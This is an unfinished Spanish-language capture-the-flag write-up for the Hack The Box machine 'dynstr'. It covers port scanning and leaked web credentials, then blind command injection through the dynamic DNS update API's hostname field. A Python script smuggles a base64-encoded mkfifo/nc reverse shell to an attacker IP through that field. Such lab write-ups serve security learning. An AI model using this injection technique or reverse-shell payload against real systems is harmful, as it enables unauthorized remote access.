---
description: Incompleto...
---

# dynstr

## Enumeración

Lo primero que hago es realizar un escaneo con nmap para saber los puertos abiertos en el rango del 1-65536.

```
# Nmap 7.92 scan initiated Sun Sep 19 14:30:41 2021 as: nmap -p- --open -T5 -v -n -oG allPorts 10.10.10.244
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.10.244 ()	Status: Up
Host: 10.10.10.244 ()	Ports: 22/open/tcp//ssh///, 53/open/tcp//domain///, 80/open/tcp//http///
# Nmap done at Sun Sep 19 14:30:58 2021 -- 1 IP address (1 host up) scanned in 16.99 seconds
```

|              |                                                                              |
| ------------ | ---------------------------------------------------------------------------- |
| Bandera      | Descripción                                                                  |
| -p-          | Escaneo a los 65536 puertos                                                  |
| --open       | Reporta solo los puertos con estado "open".                                  |
| -T5          | Exploracion a velocidades insanas (lo hago porque es un entorno de pruebas). |
| -v           | Muestra más información sobre el sondeo que se está realizando.              |
| -oG allPorts | Exporta los resultados en un formato Grepable con el nombre de allPorts.     |

Posteriormente verificamos las versiones de los servicios y haremos uso de scripts por default.

```
# Nmap 7.92 scan initiated Sun Sep 19 14:32:39 2021 as: nmap -sCV -p22,53,80 -oN targeted 10.10.10.244
Nmap scan report for 10.10.10.244
Host is up (0.055s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 05:7c:5e:b1:83:f9:4f:ae:2f:08:e1:33:ff:f5:83:9e (RSA)
|   256 3f:73:b4:95:72:ca:5e:33:f6:8a:8f:46:cf:43:35:b9 (ECDSA)
|_  256 cc:0a:41:b7:a1:9a:43:da:1b:68:f5:2a:f8:2a:75:2c (ED25519)
53/tcp open  domain  ISC BIND 9.16.1 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.16.1-Ubuntu
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Dyna DNS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Sep 19 14:32:55 2021 -- 1 IP address (1 host up) scanned in 15.29 seconds
```

|            |                                                                         |
| ---------- | ----------------------------------------------------------------------- |
| Bandera    | Descripción                                                             |
| -p22,53,80 | Escaneo a los puertos 22, 53 y 80                                       |
| -sC        | Escanea con los scripts por defecto.                                    |
| -sV        | Intenta determinar la versión del servicio que se ejecuta en el puerto. |
| -oN        | Exporta los resultados en un formato nmap.                              |

Enumeración web

En el puerto 80 podemos encontrar la siguiente web, un servicio que ofrece DNS dinámico.

![](<../../.gitbook/assets/imagen (4) (1).png>)

Y aparecen unas posibles credenciales **`dynadns:sndanyd`**.

La API de DNS dinámico también se conoce como API de actualización de NIC de miembros o API de actualización de DNS y se utiliza para actualizar las direcciones IP de los nombres de host DNS dinámicos.

Como tenemos un usuario y contraseña podemos probar a autenticarnos.

{% embed url="https://www.dynu.com/Forum/ViewTopic/badauth-being-received/439" %}

{% embed url="https://help.dyn.com/remote-access-api/return-codes" %}

{% embed url="https://help.dyn.com/remote-access-api/perform-update" %}

Como al momento de intentar resolver el DNS a través de la petición, así como lo muestran en la documentación. Obtenemos diferentes respuestas, por lo que hice una lista con todos los posibles DNS, para saber cuáles respondían de manera correcta, yo me quede con dyna.htb, pero en el momento de ejecutar el script fueron varios con respuesta correcta.

![](../../.gitbook/assets/0)

## Punto de acceso.

Vemos que está la respuesta es válida, por lo que la autenticación funciona y el DNS que hayamos elegido, también.

![](<../../.gitbook/assets/1 (1)>)

### Ejecutando comandos

Dentro de esta función probamos ejecutar algún comando e insertarlo después del **`hostname`**. Por lo que si obtuviésemos una respuesta diferente a **`good`**, quiere decir que no es posible o abra que hacerlo de otra manera. Como la ejecución de comandos es a ciegas, no obtendremos respuesta, pero podríamos comprobarlo como lo haremos más adelante.

![](../../.gitbook/assets/2)

### Probando en base64

Podemos probar si recibimos los paquetes ICMP para comprobar si podemos realizar una reverse shell. En la imagen podemos ver que la respuesta es inválida.

![](../../.gitbook/assets/4)

Podemos probarlo de otra manera, al momento de ejecutar el comando, podemos convertirlo a base64 para posteriormente mandarlo así, para que el servidor haga el decode y ejecute el comando.

![](../../.gitbook/assets/5)

Con estos cambios realizados podemos abrir Wireshark, seleccionar la interfaz del túnel, podríamos filtrar por el protocolo ICMP y observar como llegan las peticiones.

![](<../../.gitbook/assets/6 (1)>)

### Script

```python
from requests import get
from requests.auth import HTTPBasicAuth
import netifaces
from random import randint
import base64

def command_execution(username,password,ip,domains_valid):
    payload = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.107 7777 >/tmp/f"
    payload_base64 = base64.b64encode(payload.encode()).decode()
    parameters = {"hostname":"`echo '{}' | base64 -d| bash`{}".format(payload_base64,domains_valid[1]),"myip":ip}
    url = "http://dyna.htb/nic/update"
    r = get(url=url,auth=HTTPBasicAuth(username,password),params=parameters)
    print(r.text)

def check_domains(username,password,ip):
    domains = ["dnsalias.htb", "dynamicdns.htb", "no-ip.htb",
        "dnsalias.dynamicdns.htb", "dnsalias.no-ip.htb", "dnsalias.dynamicdns.no-ip.htb", "dnsalias.no-ip.dynamicdns.htb",
        "dynamicdns.dnsalias.htb", "dynamicdns.no-ip.htb", "dynamicdns.dnsalias.no-ip.htb", "dynamicdns.no-ip.dnsalias.htb",
        "no-ip.dnsalias.htb", "no-ip.dynamicdns.htb", "no-ip.dnsalias.dynamicdns.htb", "no-ip.dynamicdns.dnsalias.htb"
        ]
    domains_valid = []

    for domain in range(0,len(domains)):
        url = "http://dyna.htb/nic/update?&hostname={}&myip={}".format(domains[domain],ip)
        r = get(url=url,auth=HTTPBasicAuth(username,password))
        if r.text.find("911") == -1:
            domains_valid.append(domains[domain])

    print(domains_valid)
    return domains_valid

def main():
    username = "dynadns"
    password = "sndanyd"
    ip = netifaces.ifaddresses('tun0')[netifaces.AF_INET][0]['addr']
    
    #domains_valid = check_domains(username,password,ip)
    check_domains = ['dnsalias.dynamicdns.htb', 'dnsalias.no-ip.htb', 'dynamicdns.dnsalias.htb', 'dynamicdns.no-ip.htb', 'no-ip.dnsalias.htb', 'no-ip.dynamicdns.htb']
    command_execution(username,password,ip,check_domains)

if __name__ == "__main__":
    main()
```

## Escalada de privilegios

Realizando la enumeración en el servidor, en el directorio del usuario **`bindmgr`** podemos ver unos archivos que podrían contener información interesante.

![](../../.gitbook/assets/7)



![](../../.gitbook/assets/8)

Solo podemos revisar authorized\_keys, pero solo se permite el acceso a hostnames con el nombre de \<nombre>.infra.dyna.htb.

**`from="*.infra.dyna.htb" ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDF4pkc7L5EaGz6CcwSCx1BqzuSUBvfseFUA0mBjsSh7BPCZIJyyXXjaS69SHEu6W2UxEKPWmdlj/WwmpPLA8ZqVHtVej7aXQPDHfPHuRAWI95AnCI4zy7+DyVXceMacK/MjhSiMAuMIfdg9W6+6EXTIg+8kN6yx2i38PZU8mpL5MP/g2iDKcV5SukhbkNI/4UvqheKX6w4znOJElCX+AoJZYO1QcdjBywmlei0fGvk+JtTwSBooPr+F5lewPcafVXKw1l2dQ4vONqlsN1EcpEkN+28ndlclgvm+26mhm7NNMPVWs4yeDXdDlP3SSd1ynKEJDnQhbhc1tcJSPEn7WOD bindmgr@nomen`**

{% embed url="https://www.ssh.com/academy/ssh/authorized_keys/openssh#from=%22pattern-list%22" %}

cat strace-C62796521.txt

![](../../.gitbook/assets/9)
